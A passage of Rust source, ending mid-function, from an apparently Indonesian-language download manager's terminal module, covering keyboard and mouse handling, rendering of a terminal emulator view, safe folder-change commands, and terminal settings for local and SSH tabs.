//! Terminal tabs and the terminal view (local shells and SSH shells).
//!
//! Compiled as a child module of `app` (`#[path]` in app.rs) so it can use `App`'s private fields.

use eframe::egui::{self, Event};
use unduhkilat_core::term::engine::TermModes;
use unduhkilat_core::term::keys::{encode_key, Key, Mods};

/// What the user did in the terminal, in terms the session understands.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum TermInput {
    /// Bytes for the program (text, control keys, escape sequences).
    Bytes(Vec<u8>),
    /// Text to paste (the session chunks and wraps it).
    Paste(String),
    /// Copy the selection to the clipboard.
    Copy,
    /// Alt+V: upload the clipboard picture to the server and type its path.
    PasteImage,
    /// Ask the system for the clipboard text; it comes back as a Paste event.
    RequestPaste,
}

/// Keyboard state that the egui events alone do not carry.
#[derive(Debug, Clone, Copy)]
pub struct KeyContext {
    pub mods: egui::Modifiers,
    /// The Insert key is down (distinguishes Ctrl+Insert from Ctrl+C, Shift+Insert from Ctrl+V).
    pub insert_down: bool,
    /// Alt+V pastes a picture (SSH tabs): the picture is uploaded and its path typed.
    pub alt_v_image: bool,
}

fn mods_of(m: &egui::Modifiers) -> Mods {
    Mods { ctrl: m.ctrl, alt: m.alt, shift: m.shift }
}

/// Map an egui key to the terminal key it stands for. Letters and punctuation are reported as the
/// (unshifted) character, so Ctrl and Alt combinations encode correctly.
fn map_key(key: egui::Key, shift: bool) -> Option<Key> {
    use egui::Key as K;
    let ch = |c: char| Some(Key::Char(if shift { c.to_ascii_uppercase() } else { c }));
    Some(match key {
        K::Enter => Key::Enter,
        K::Tab => Key::Tab,
        K::Backspace => Key::Backspace,
        K::Escape => Key::Escape,
        K::ArrowUp => Key::Up,
        K::ArrowDown => Key::Down,
        K::ArrowLeft => Key::Left,
        K::ArrowRight => Key::Right,
        K::Home => Key::Home,
        K::End => Key::End,
        K::PageUp => Key::PageUp,
        K::PageDown => Key::PageDown,
        K::Insert => Key::Insert,
        K::Delete => Key::Delete,
        K::F1 => Key::F(1),
        K::F2 => Key::F(2),
        K::F3 => Key::F(3),
        K::F4 => Key::F(4),
        K::F5 => Key::F(5),
        K::F6 => Key::F(6),
        K::F7 => Key::F(7),
        K::F8 => Key::F(8),
        K::F9 => Key::F(9),
        K::F10 => Key::F(10),
        K::F11 => Key::F(11),
        K::F12 => Key::F(12),
        K::Space => Key::Char(' '),
        K::Minus => return ch('-'),
        K::Equals => return ch('='),
        K::Comma => return ch(','),
        K::Period => return ch('.'),
        K::Slash => return ch('/'),
        K::Backslash => return ch('\\'),
        K::Semicolon => return ch(';'),
        K::Quote => return ch('\''),
        K::Backtick => return ch('`'),
        K::OpenBracket => return ch('['),
        K::CloseBracket => return ch(']'),
        other => {
            // Letters and digits: the key's name is the character ("A", "7").
            let name = other.name();
            let mut it = name.chars();
            match (it.next(), it.next()) {
                (Some(c), None) if c.is_ascii_alphanumeric() => return ch(c.to_ascii_lowercase()),
                _ => return None,
            }
        }
    })
}

fn is_text_key(k: &Key) -> bool {
    matches!(k, Key::Char(_))
}

/// Turn one frame of egui events into terminal input.
///
/// * Typed text arrives as `Event::Text`; key events are used only for keys that produce no text
///   (Enter, arrows, F-keys, ...) and for Ctrl/Alt combinations, so nothing is sent twice.
/// * `Ctrl+C` copies only when text is selected; otherwise the program gets the interrupt.
///   `Ctrl+Shift+C` and `Ctrl+Insert` always copy.
/// * `Ctrl+V` pastes (unless the setting hands it to the program as `0x16`); `Ctrl+Shift+V` and
///   `Shift+Insert` always paste.
pub fn translate_events(events: &[Event], modes: &TermModes, has_selection: bool, ctrl_v_pastes: bool, kc: &KeyContext) -> Vec<TermInput> {
    // Characters already produced by a Ctrl/Alt key event: their Text twin must not be sent again.
    let mut combo_chars: Vec<char> = Vec::new();
    for ev in events {
        if let Event::Key { key, pressed: true, modifiers, .. } = ev {
            if modifiers.ctrl || modifiers.alt {
                if let Some(Key::Char(c)) = map_key(*key, modifiers.shift) {
                    combo_chars.push(c.to_ascii_lowercase());
                }
            }
        }
    }
    let mut out = Vec::new();
    for ev in events {
        match ev {
            Event::Text(t) => {
                let mut chars = t.chars();
                if let (Some(c), None) = (chars.next(), chars.next()) {
                    if combo_chars.contains(&c.to_ascii_lowercase()) {
                        continue;
                    }
                }
                if !t.is_empty() {
                    out.push(TermInput::Bytes(t.as_bytes().to_vec()));
                }
            }
            Event::Paste(text) => {
                let plain_ctrl_v = kc.mods.ctrl && !kc.mods.shift && !kc.insert_down;
                if plain_ctrl_v && !ctrl_v_pastes {
                    out.push(TermInput::Bytes(vec![0x16]));
                } else {
                    out.push(TermInput::Paste(text.clone()));
                }
            }
            Event::Copy => {
                if kc.mods.shift || kc.insert_down || has_selection {
                    out.push(TermInput::Copy);
                } else {
                    out.push(TermInput::Bytes(vec![0x03]));
                }
            }
            Event::Cut => out.push(TermInput::Bytes(vec![0x18])),
            Event::Key { key: egui::Key::V, pressed: true, modifiers, .. } if kc.alt_v_image && modifiers.alt && !modifiers.ctrl && !modifiers.shift => out.push(TermInput::PasteImage),
            // Committed IME text (Chinese, Japanese, Vietnamese, the emoji panel).
            Event::Ime(egui::ImeEvent::Commit(t)) if !t.is_empty() => out.push(TermInput::Bytes(t.as_bytes().to_vec())),
            // egui only turns Ctrl+C / Ctrl+V into Copy / Paste events when Shift is up; the
            // Ctrl+Shift forms ("always copy / paste") arrive as plain keys and must not become ^C or ^V.
            Event::Key { key: egui::Key::C, pressed: true, modifiers, .. } if modifiers.ctrl && modifiers.shift && !modifiers.alt => out.push(TermInput::Copy),
            Event::Key { key: egui::Key::V, pressed: true, modifiers, .. } if modifiers.ctrl && modifiers.shift && !modifiers.alt => out.push(TermInput::RequestPaste),
            Event::Key { key, pressed: true, modifiers, .. } => {
                let Some(k) = map_key(*key, modifiers.shift) else { continue };
                if is_text_key(&k) && !(modifiers.ctrl || modifiers.alt) {
                    continue; // the Text event carries it
                }
                let bytes = encode_key(k, mods_of(modifiers), modes);
                if !bytes.is_empty() {
                    out.push(TermInput::Bytes(bytes));
                }
            }
            _ => {}
        }
    }
    out
}

use eframe::egui::{Align2, Color32, FontId, Pos2, Rect, Sense, Stroke, TextFormat, Ui, Vec2};
use unduhkilat_core::term::engine::{CellView, CursorShape, CursorView, MouseMode, Rgb, SelectKind};
use unduhkilat_core::term::mouse::{encode_mouse, wheel_as_arrows, MouseButton, MouseEvent, MouseKind};
use unduhkilat_core::term::session::TermSession;

const TERM_BG: Color32 = Color32::from_rgb(0x14, 0x12, 0x0F);
const SELECTION_FILL: Color32 = Color32::from_rgba_premultiplied(0x60, 0x2A, 0x10, 0x60);

fn color(c: Rgb) -> Color32 {
    Color32::from_rgb(c.0, c.1, c.2)
}

/// Everything the painter needs from the emulator, copied under one short lock.
struct Snapshot {
    rows: Vec<Vec<CellView>>,
    cursor: Option<CursorView>,
    modes: unduhkilat_core::term::engine::TermModes,
    selection: Option<((i32, u16), (i32, u16))>,
    has_selection: bool,
}

fn snapshot(session: &TermSession) -> Snapshot {
    session.with_engine(|e| {
        let (cols, rows) = e.size();
        Snapshot {
            rows: (0..rows).map(|r| (0..cols).map(|c| e.cell(r, c)).collect()).collect(),
            cursor: e.cursor(),
            modes: e.modes(),
            selection: e.selection_viewport(),
            has_selection: e.selected_text().is_some(),
        }
    })
}

fn selected(sel: Option<((i32, u16), (i32, u16))>, row: usize, col: usize) -> bool {
    match sel {
        Some((a, b)) => (row as i32, col as u16) >= (a.0, a.1) && (row as i32, col as u16) <= (b.0, b.1),
        None => false,
    }
}

fn same_style(a: &CellView, b: &CellView) -> bool {
    a.fg == b.fg && a.italic == b.italic && a.underline == b.underline && a.strike == b.strike
}

/// Draw state kept between frames for one terminal.
#[derive(Default)]
pub struct TerminalView {
    last_size: (u16, u16),
    scroll_accum: f32,
    dragging_selection: bool,
    reporting_drag: Option<MouseButton>,
    was_focused: bool,
    focused_once: bool,
    /// Alt+V means "paste picture" in this view (SSH tabs).
    pub alt_v_image: bool,
    /// Set when Alt+V was pressed; the screen takes it and starts the upload.
    pub image_requested: bool,
}

impl TerminalView {
    /// Whether the terminal had keyboard focus in the last frame.
    pub fn has_focus(&self) -> bool {
        self.was_focused
    }

    /// Draw the terminal into the available space and handle its input. Returns text that still needs
    /// the user's confirmation before being pasted (several lines into a program without bracketed paste).
    pub fn show(&mut self, ui: &mut Ui, session: &TermSession, font_size: f32, ctrl_v_pastes: bool) -> Option<String> {
        let font = FontId::monospace(font_size);
        let glyph = ui.painter().layout_no_wrap("M".to_string(), font.clone(), Color32::WHITE).size();
        let (cw, ch) = (glyph.x.max(1.0), glyph.y.max(1.0));
        let avail = ui.available_size();
        let (cols, rows) = (((avail.x / cw).floor() as u16).max(1), ((avail.y / ch).floor() as u16).max(1));
        let (rect, response) = ui.allocate_exact_size(avail, Sense::click_and_drag());
        if (cols, rows) != self.last_size {
            session.resize(cols, rows);
            self.last_size = (cols, rows);
        }
        if !self.focused_once {
            response.request_focus();
            self.focused_once = true;
        }
        if response.clicked() || response.drag_started() {
            response.request_focus();
        }
        // Tab, arrows and Escape belong to the program while the terminal has focus.
        ui.ctx().memory_mut(|m| m.set_focus_lock_filter(response.id, egui::EventFilter { tab: true, horizontal_arrows: true, vertical_arrows: true, escape: true }));
        let focused = response.has_focus();

        let snap = snapshot(session);
        let painter = ui.painter_at(rect);
        painter.rect_filled(rect, 0.0, TERM_BG);
        self.paint(&painter, rect, &snap, &font, (cw, ch), focused);

        let mut confirm = None;
        confirm = confirm.or(self.handle_keyboard(ui, session, &snap, ctrl_v_pastes, focused));
        self.handle_mouse(ui, session, &snap, rect, (cw, ch), (cols, rows), &response);
        if focused != self.was_focused {
            if snap.modes.focus_events {
                session.send(if focused { b"\x1b[I".to_vec() } else { b"\x1b[O".to_vec() });
            }
            self.was_focused = focused;
        }
        response.context_menu(|ui| {
            if ui.add_enabled(snap.has_selection, egui::Button::new("Salin")).clicked() {
                if let Some(t) = session.with_engine(|e| e.selected_text()) {
                    ui.ctx().copy_text(t);
                }
                ui.close();
            }
            if ui.button("Tempel").clicked() {
                ui.ctx().send_viewport_cmd(egui::ViewportCommand::RequestPaste);
                ui.close();
            }
            if ui.button("Pilih semua").clicked() {
                session.with_engine(|e| e.select_all());
                ui.close();
            }
            if ui.button("Bersihkan layar").clicked() {
                session.with_engine(|e| e.clear_screen_and_history());
                ui.close();
            }
        });
        confirm
    }

    fn paint(&self, painter: &egui::Painter, rect: Rect, snap: &Snapshot, font: &FontId, (cw, ch): (f32, f32), focused: bool) {
        let origin = rect.min;
        for (r, row) in snap.rows.iter().enumerate() {
            let y = origin.y + r as f32 * ch;
            // Backgrounds and the selection, run by run.
            let mut c = 0;
            while c < row.len() {
                let sel = selected(snap.selection, r, c);
                let cell = &row[c];
                if cell.bg_default && !sel {
                    c += 1;
                    continue;
                }
                let start = c;
                while c < row.len() && selected(snap.selection, r, c) == sel && (row[c].bg_default == cell.bg_default) && (cell.bg_default || row[c].bg == cell.bg) {
                    c += 1;
                }
                let run = Rect::from_min_size(Pos2::new(origin.x + start as f32 * cw, y), Vec2::new((c - start) as f32 * cw, ch));
                if !cell.bg_default {
                    painter.rect_filled(run, 0.0, color(cell.bg));
                }
                if sel {
                    painter.rect_filled(run, 0.0, SELECTION_FILL);
                }
            }
            // Text: ASCII runs as one galley (the monospace face keeps them on the grid), anything else
            // character by character at its own cell so fallback fonts cannot shift the columns.
            let mut c = 0;
            while c < row.len() {
                let cell = &row[c];
                if cell.spacer {
                    c += 1;
                    continue;
                }
                let x = origin.x + c as f32 * cw;
                if (' '..='~').contains(&cell.ch) {
                    let start = c;
                    let mut text = String::new();
                    while c < row.len() && (' '..='~').contains(&row[c].ch) && !row[c].spacer && same_style(&row[c], cell) {
                        text.push(row[c].ch);
                        c += 1;
                    }
                    if text.trim().is_empty() && !cell.underline && !cell.strike {
                        continue;
                    }
                    let mut job = egui::text::LayoutJob::default();
                    job.append(&text, 0.0, text_format(font, cell));
                    let galley = painter.layout_job(job);
                    painter.galley(Pos2::new(origin.x + start as f32 * cw, y), galley, color(cell.fg));
                } else {
                    let mut job = egui::text::LayoutJob::default();
                    job.append(&cell.ch.to_string(), 0.0, text_format(font, cell));
                    let galley = painter.layout_job(job);
                    painter.galley(Pos2::new(x, y), galley, color(cell.fg));
                    c += if cell.wide { 2 } else { 1 };
                }
            }
        }
        if let Some(cur) = snap.cursor {
            let cell = snap.rows.get(cur.row as usize).and_then(|r| r.get(cur.col as usize));
            let wide = cell.map(|c| c.wide).unwrap_or(false);
            let w = if wide { cw * 2.0 } else { cw };
            let at = Pos2::new(origin.x + cur.col as f32 * cw, origin.y + cur.row as f32 * ch);
            let cursor_color = Color32::from_rgb(0xE8, 0xE3, 0xDC);
            match (cur.shape, focused) {
                (CursorShape::Block, true) => {
                    painter.rect_filled(Rect::from_min_size(at, Vec2::new(w, ch)), 0.0, cursor_color);
                    if let Some(cell) = cell {
                        if cell.ch != ' ' {
                            painter.text(at, Align2::LEFT_TOP, cell.ch.to_string(), font.clone(), TERM_BG);
                        }
                    }
                }
                (CursorShape::Underline, true) => {
                    painter.rect_filled(Rect::from_min_size(Pos2::new(at.x, at.y + ch - 2.0), Vec2::new(w, 2.0)), 0.0, cursor_color);
                }
                (CursorShape::Bar, true) => {
                    painter.rect_filled(Rect::from_min_size(at, Vec2::new(2.0, ch)), 0.0, cursor_color);
                }
                (_, false) => {
                    painter.rect_stroke(Rect::from_min_size(at, Vec2::new(w, ch)), 0.0, Stroke::new(1.0, cursor_color), egui::StrokeKind::Inside);
                }
            }
        }
    }

    /// Keys, text, paste and copy while the terminal has focus.
    fn handle_keyboard(&mut self, ui: &mut Ui, session: &TermSession, snap: &Snapshot, ctrl_v_pastes: bool, focused: bool) -> Option<String> {
        if !focused {
            return None;
        }
        // Tell Windows an IME may type here (otherwise it stays off for the whole window).
        let area = ui.clip_rect();
        ui.ctx().output_mut(|o| {
            o.ime = Some(egui::output::IMEOutput { purpose: egui::IMEPurpose::Terminal, rect: area, cursor_rect: egui::Rect::from_min_size(area.min, Vec2::new(1.0, 16.0)), should_interrupt_composition: false });
        });
        let (events, mods, insert_down) = ui.input(|i| (i.events.clone(), i.modifiers, i.key_down(egui::Key::Insert)));
        let inputs = translate_events(&events, &snap.modes, snap.has_selection, ctrl_v_pastes, &KeyContext { mods, insert_down, alt_v_image: self.alt_v_image });
        if inputs.is_empty() {
            return None;
        }
        // These events are ours now: nothing else on screen may react to them.
        ui.input_mut(|i| {
            i.events.retain(|e| !matches!(e, egui::Event::Text(_) | egui::Event::Paste(_) | egui::Event::Copy | egui::Event::Cut | egui::Event::Ime(_) | egui::Event::Key { pressed: true, .. }));
        });
        let mut confirm = None;
        for input in inputs {
            match input {
                TermInput::Bytes(b) => {
                    session.with_engine(|e| e.scroll_to_bottom());
                    session.send(b);
                }
                TermInput::Paste(text) => {
                    session.with_engine(|e| e.scroll_to_bottom());
                    if session.paste_needs_confirm(&text) {
                        confirm = Some(text);
                    } else {
                        session.paste(text);
                    }
                }
                TermInput::Copy => {
                    if let Some(t) = session.with_engine(|e| e.selected_text()) {
                        ui.ctx().copy_text(t);
                    }
                }
                TermInput::RequestPaste => ui.ctx().send_viewport_cmd(egui::ViewportCommand::RequestPaste),
                TermInput::PasteImage => self.image_requested = true,
            }
        }
        confirm
    }

    #[allow(clippy::too_many_arguments)]
    fn handle_mouse(&mut self, ui: &mut Ui, session: &TermSession, snap: &Snapshot, rect: Rect, (cw, ch): (f32, f32), (cols, rows): (u16, u16), response: &egui::Response) {
        let cell_at = |p: Pos2| -> (u16, u16) {
            let c = (((p.x - rect.min.x) / cw).floor().max(0.0) as u16).min(cols - 1);
            let r = (((p.y - rect.min.y) / ch).floor().max(0.0) as u16).min(rows - 1);
            (r, c)
        };
        let (events, mods, hover) = ui.input(|i| (i.events.clone(), i.modifiers, i.pointer.hover_pos()));
        let report = snap.modes.mouse != MouseMode::Off && !mods.shift;
        let m = Mods { ctrl: mods.ctrl, alt: mods.alt, shift: mods.shift };
        let button = |b: egui::PointerButton| match b {
            egui::PointerButton::Primary => Some(MouseButton::Left),
            egui::PointerButton::Middle => Some(MouseButton::Middle),
            egui::PointerButton::Secondary => Some(MouseButton::Right),
            _ => None,
        };
        // A menu or dialog drawn over the terminal must not receive the terminal's clicks.
        let layer = ui.layer_id();
        let ctx = ui.ctx().clone();
        let on_top = |p: Pos2| ctx.layer_id_at(p).map(|l| l == layer).unwrap_or(true);
        for ev in &events {
            match ev {
                egui::Event::PointerButton { pos, button: b, pressed, .. } => {
                    let Some(mb) = button(*b) else { continue };
                    let (r, c) = cell_at(*pos);
                    if *pressed && rect.contains(*pos) && on_top(*pos) {
                        if report {
                            self.reporting_drag = Some(mb);
                            if let Some(bytes) = encode_mouse(&MouseEvent { kind: MouseKind::Press(mb), col: c, row: r, mods: m }, &snap.modes) {
                                session.send(bytes);
                            }
                        } else if mb == MouseButton::Left {
                            let (dbl, triple) = ui.input(|i| (i.pointer.button_double_clicked(egui::PointerButton::Primary), i.pointer.button_triple_clicked(egui::PointerButton::Primary)));
                            session.with_engine(|e| {
                                if mods.shift && snap.has_selection {
                                    e.select_update(r, c);
                                } else {
                                    e.select_start(if triple { SelectKind::Line } else if dbl { SelectKind::Word } else { SelectKind::Simple }, r, c);
                                }
                            });
                            self.dragging_selection = true;
                        }
                    } else if !*pressed {
                        if let Some(held) = self.reporting_drag.take() {
                            if held == mb {
                                if let Some(bytes) = encode_mouse(&MouseEvent { kind: MouseKind::Release(mb), col: c, row: r, mods: m }, &snap.modes) {
                                    session.send(bytes);
                                }
                            } else {
                                self.reporting_drag = Some(held);
                            }
                        }
                        if mb == MouseButton::Left {
                            self.dragging_selection = false;
                        }
                    }
                }
                egui::Event::PointerMoved(pos) => {
                    let (r, c) = cell_at(*pos);
                    if self.reporting_drag.is_some() || (report && rect.contains(*pos) && on_top(*pos)) {
                        if let Some(bytes) = encode_mouse(&MouseEvent { kind: MouseKind::Move { held: self.reporting_drag }, col: c, row: r, mods: m }, &snap.modes) {
                            session.send(bytes);
                        }
                    } else if self.dragging_selection {
                        session.with_engine(|e| e.select_update(r, c));
                    }
                }
                _ => {}
            }
        }
        // Wheel: report to the program, send arrows on the alternate screen, or scroll the history.
        if hover.map(|p| rect.contains(p)).unwrap_or(false) && response.hovered() {
            let dy = ui.input(|i| i.smooth_scroll_delta.y);
            self.scroll_accum += dy / ch;
            let lines = self.scroll_accum.trunc() as i32;
            if lines != 0 {
                self.scroll_accum -= lines as f32;
                let up = lines > 0;
                let n = lines.unsigned_abs();
                let (r, c) = cell_at(hover.unwrap());
                if report {
                    for _ in 0..n {
                        let kind = if up { MouseKind::WheelUp } else { MouseKind::WheelDown };
                        if let Some(bytes) = encode_mouse(&MouseEvent { kind, col: c, row: r, mods: m }, &snap.modes) {
                            session.send(bytes);
                        }
                    }
                } else if let Some(bytes) = wheel_as_arrows(up, n * 3, &snap.modes) {
                    session.send(bytes);
                } else {
                    session.with_engine(|e| e.scroll(lines * 3));
                }
            }
        }
    }
}

fn text_format(font: &FontId, cell: &CellView) -> TextFormat {
    let mut f = TextFormat::simple(font.clone(), color(cell.fg));
    f.italics = cell.italic;
    if cell.underline {
        f.underline = Stroke::new(1.0, color(cell.fg));
    }
    if cell.strike {
        f.strikethrough = Stroke::new(1.0, color(cell.fg));
    }
    f
}

use super::{App, Screen};
use crate::theme::{self, *};
use eframe::egui::{Align, Layout, RichText};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Instant;
use unduhkilat_core::config::keys;
use unduhkilat_core::repo;
use unduhkilat_core::term::local::{detect_shells, spawn_local, ShellKind, ShellOptions};
use unduhkilat_core::server::service::OpenedTerminal;
use unduhkilat_core::server::stats::{ServerStats, StatsState};
use unduhkilat_core::term::session::SessionStatus;

// ---- pure helpers (unit tested) ---------------------------------------------------------------

pub const DEFAULT_FONT_SIZE: f32 = 13.0;
const SCROLLBACK: usize = 10_000;
const MAX_FILES: usize = 2000;

/// Preview size limit in MB (default 25, 1 to 500).
pub fn preview_mb_from_setting(v: Option<&str>) -> u32 {
    v.and_then(|s| s.trim().parse::<u32>().ok()).map(|n| n.clamp(1, 500)).unwrap_or(25)
}

pub fn font_size_from_setting(v: Option<&str>) -> f32 {
    v.and_then(|s| s.trim().parse::<f32>().ok()).filter(|x| x.is_finite()).map(|x| x.clamp(8.0, 32.0)).unwrap_or(DEFAULT_FONT_SIZE)
}

/// Where a new terminal starts: the folder setting if it exists, else Downloads, else the home folder,
/// else the working folder.
pub fn start_dir(setting: Option<&str>, home: Option<&Path>) -> PathBuf {
    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(s) = setting.map(str::trim).filter(|s| !s.is_empty()) {
        candidates.push(PathBuf::from(s));
    }
    if let Some(h) = home {
        candidates.push(h.join("Downloads"));
        candidates.push(h.to_path_buf());
    }
    candidates.into_iter().find(|p| p.is_dir()).unwrap_or_else(|| std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")))
}

/// The program's own title (OSC 0/2) when it set one, cut to a tab-sized length.
pub fn tab_title(base: &str, program_title: Option<&str>) -> String {
    let t = program_title.map(str::trim).filter(|t| !t.is_empty()).unwrap_or(base);
    if t.chars().count() > 24 {
        let cut: String = t.chars().take(23).collect();
        format!("{cut}\u{2026}")
    } else {
        t.to_string()
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TerminalLayout {
    /// Terminal and files take turns (a switch above them).
    A,
    /// Terminal and files side by side.
    B,
}

impl TerminalLayout {
    pub fn from_setting(v: Option<&str>) -> Self {
        if v.map(|s| s.trim().eq_ignore_ascii_case("b")).unwrap_or(false) {
            TerminalLayout::B
        } else {
            TerminalLayout::A
        }
    }
    pub fn as_setting(&self) -> &'static str {
        match self {
            TerminalLayout::A => "a",
            TerminalLayout::B => "b",
        }
    }
}

/// Where a terminal opens for a download: its folder, or the folder holding the file; when that is
/// gone, the nearest folder above it that still exists.
pub fn terminal_dir_for(target_path: &str) -> PathBuf {
    let p = Path::new(target_path);
    if p.is_dir() {
        return p.to_path_buf();
    }
    let mut cur = p.parent();
    while let Some(c) = cur {
        if c.is_dir() {
            return c.to_path_buf();
        }
        cur = c.parent();
    }
    std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
}

/// The line that makes a running PowerShell or CMD change folder, or `None` when the folder name
/// cannot be typed safely (folder names come from downloads, so they are not trusted).
pub fn cd_command(kind: ShellKind, dir: &str) -> Option<String> {
    if dir.chars().any(|c| c.is_control()) {
        return None;
    }
    match kind {
        // Single quotes: nothing inside is expanded, and `-LiteralPath` ignores wildcard brackets.
        ShellKind::PowerShell => Some(format!("Set-Location -LiteralPath '{}'\r", dir.replace('\'', "''"))),
        // CMD expands %VAR% even inside quotes and a quote can end the argument.
        ShellKind::Cmd if !dir.contains('%') && !dir.contains('"') => Some(format!("cd /d \"{dir}\"\r")),
        _ => None,
    }
}

/// Tab title and subtitle of an SSH tab: the server, and the jump hosts it is reached through.
pub fn ssh_tab_labels(target: &str, via: &[String]) -> (String, String) {
    let sub = if via.is_empty() { "langsung".to_string() } else { format!("via {}", via.join(" \u{2192} ")) };
    (target.to_string(), sub)
}

/// App-wide shortcuts (Ctrl+N, Delete)r must not take keys the program in the terminal is meant to get.
pub fn shortcuts_enabled(screen_is_terminal: bool, terminal_focused: bool) -> bool {
    !(screen_is_terminal && terminal_focused)
}

// ---- state --------------------------------------------------------------------------------------

#[derive(Clone)]
pub struct TermSettings {
    pub shell: ShellKind,
    pub start_dir: PathBuf,
    pub font_size: f32,
    pub ctrl_v_pastes: bool,
    pub layout: TerminalLayout,
    /// Largest file the server preview fetches whole, in MB.
    pub preview_max_mb: u32,
    /// Info bar (CPU, RAM, connections, ...) under SSH terminals.
    pub server_stats: bool,
}

impl TermSettings {
    pub fn load(get: impl Fn(&str) -> Option<String>) -> TermSettings {
        let home = std::env::var_os("USERPROFILE").map(PathBuf::from);
        TermSettings {
            shell: ShellKind::from_setting(get(keys::TERMINAL_SHELL).as_deref()),
            start_dir: start_dir(get(keys::TERMINAL_START_DIR).as_deref(), home.as_deref()),
            font_size: font_size_from_setting(get(keys::TERMINAL_FONT_SIZE).as_deref()),
            ctrl_v_pastes: get(keys::TERMINAL_CTRL_V_PASTES).map(|v| v != "0").unwrap_or(true),
            layout: TerminalLayout::from_setting(get(keys::TERMINAL_LAYOUT).as_deref()),
            preview_max_mb: preview_mb_from_setting(get(keys::PREVIEW_MAX_MB).as_deref()),
            server_stats: get(keys::TERMINAL_SERVER_STATS).map(|v| v != "0").unwrap_or(true),
        }
    }
}

impl TermSettings {
    pub fn save(&self, mut set: impl FnMut(&str, &str) -> unduhkilat_core::Result<()>) -> unduhkilat_core::Result<()> {
        set(keys::TERMINAL_SHELL, self.shell.as_setting())?;
        set(keys::TERMINAL_START_DIR, &self.start_dir.display().to_string())?;
        set(keys::TERMINAL_FONT_SIZE, &self.font_size.to_string())?;
        set(keys::TERMINAL_CTRL_V_PASTES, if self.ctrl_v_pastes { "1" } else { "0" })?;
        set(keys::PREVIEW_MAX_MB, &self.preview_max_mb.to_string())?;
        set(keys::TERMINAL_SERVER_STATS, if self.server_stats { "1" } else { "0" })?;
        set(keys::TERMINAL_LAYOUT, self.layout.as_setting())
    }
}

/// The "Terminal" tab of Settings.
pub fn settings_ui(ui: &mut egui::Ui, s: &mut TermSettings) {
    ui.label(RichText::new("Shell bawaan").font(theme::bold(13.0)));
    egui::ComboBox::from_id_salt("term-shell").selected_text(s.shell.label()).show_ui(ui, |ui| {
        for k in detect_shells() {
            ui.selectable_value(&mut s.shell, k, k.label());
        }
    });
    ui.add_space(8.0);
    ui.label(RichText::new("Folder awal").font(theme::bold(13.0)));
    let mut dir = s.start_dir.display().to_string();
    if ui.add(egui::TextEdit::singleline(&mut dir).desired_width(420.0)).changed() {
        s.start_dir = PathBuf::from(dir);
    }
    ui.label(RichText::new("Dipakai untuk terminal baru yang tidak dibuka dari sebuah folder. Bila folder tidak ada, dipakai folder Unduhan.").color(FG_SECONDARY));
    ui.add_space(8.0);
    ui.label(RichText::new("Ukuran huruf").font(theme::bold(13.0)));
    ui.add(egui::Slider::new(&mut s.font_size, 8.0..=32.0).step_by(0.5));
    ui.add_space(8.0);
    ui.checkbox(&mut s.ctrl_v_pastes, "Ctrl+V menempel teks (Ctrl+C menyalin bila ada teks terpilih)");
    ui.add_space(8.0);
    ui.label(RichText::new("Batas pratinjau berkas server (MB)").font(theme::bold(13.0)));
    ui.add(egui::DragValue::new(&mut s.preview_max_mb).range(1..=500).suffix(" MB"));
    ui.label(RichText::new("Gambar, PDF, dan dokumen lebih besar dari ini tidak diambil; gunakan Unduh atau Buka di aplikasi Windows. Teks hanya dibaca bagian awalnya.").color(FG_SECONDARY));
    ui.add_space(8.0);
    ui.label(RichText::new("Tata letak").font(theme::bold(13.0)));
    ui.radio_value(&mut s.layout, TerminalLayout::A, "A: Terminal dan Berkas bergantian");
    ui.radio_value(&mut s.layout, TerminalLayout::B, "B: Terminal dan Berkas berdampingan");
    ui.add_space(8.0);
    ui.checkbox(&mut s.server_stats, "Tampilkan info server di bawah terminal SSH");
    ui.label(RichText::new("CPU, RAM, koneksi, proses, uptime, pengguna, dan isi disk /, dibaca tiap 3 detik lewat sambungan SSH yang sama. Hanya server Linux; berlaku untuk sambungan berikutnya.").color(FG_SECONDARY));
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum TabKind {
    Local(ShellKind),
    Ssh { server_id: String },
    /// A file explorer only (FTP, FTPS, or SFTP without a terminal).
    Files { server_id: String },
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum TabStatus {
    Connecting,
    Running,
    Ended(Option<i32>),
    Failed(String),
}

pub struct TermTab {
    pub id: u64,
    pub base_title: String,
    pub subtitle: String,
    pub kind: TabKind,
    pub session: Option<TermSession>,
    pub status: TabStatus,
    view: TerminalView,
    show_files: bool,
    cwd: PathBuf,
    files_dir: PathBuf,
    /// Items chosen in the local files pane (click selects, Ctrl+click adds, double-click opens a folder).
    selected_files: std::collections::BTreeSet<PathBuf>,
    /// Cancels a connection attempt that is still in progress (SSH tabs).
    cancel: Option<tokio_util::sync::CancellationToken>,
    /// File explorer of an SSH or server tab; created the first time it is shown.
    pub explorer: Option<super::explorer::ExplorerState>,
    /// System info of the server (SSH tabs with the info bar on).
    stats: Option<tokio::sync::watch::Receiver<StatsState>>,
}

#[derive(Default)]
pub struct TerminalState {
    pub tabs: Vec<TermTab>,
    pub active: usize,
    next_id: u64,
    confirm_close: Option<u64>,
    confirm_paste: Option<(u64, String)>,
    /// The terminal had keyboard focus in the last frame.
    pub captured: bool,
    /// Server paths of pictures pasted with Alt+V, per tab; deleted when the tab closes.
    pub pasted: std::collections::HashMap<u64, Vec<String>>,
    /// Terminal fills the window (no header, sidebar, or status bar).
    pub maximized: bool,
    settings: Option<TermSettings>,
}

impl TermTab {
    /// A tab that is only a file explorer (no terminal session).
    pub fn files(id: u64, title: &str, subtitle: &str, server_id: &str) -> TermTab {
        TermTab {
            id,
            base_title: title.to_string(),
            subtitle: subtitle.to_string(),
            kind: TabKind::Files { server_id: server_id.to_string() },
            session: None,
            status: TabStatus::Running,
            view: TerminalView::default(),
            show_files: true,
            cwd: PathBuf::new(),
            files_dir: PathBuf::new(),
            selected_files: Default::default(),
            cancel: None,
            explorer: None,
            stats: None,
        }
    }
}

impl TerminalState {
    pub fn next_tab_id(&mut self) -> u64 {
        let id = self.next_id;
        self.next_id += 1;
        id
    }

    pub fn apply_settings(&mut self, s: TermSettings) {
        self.settings = Some(s);
    }
}

fn dialog_window(title: &str, width: f32) -> egui::Window<'static> {
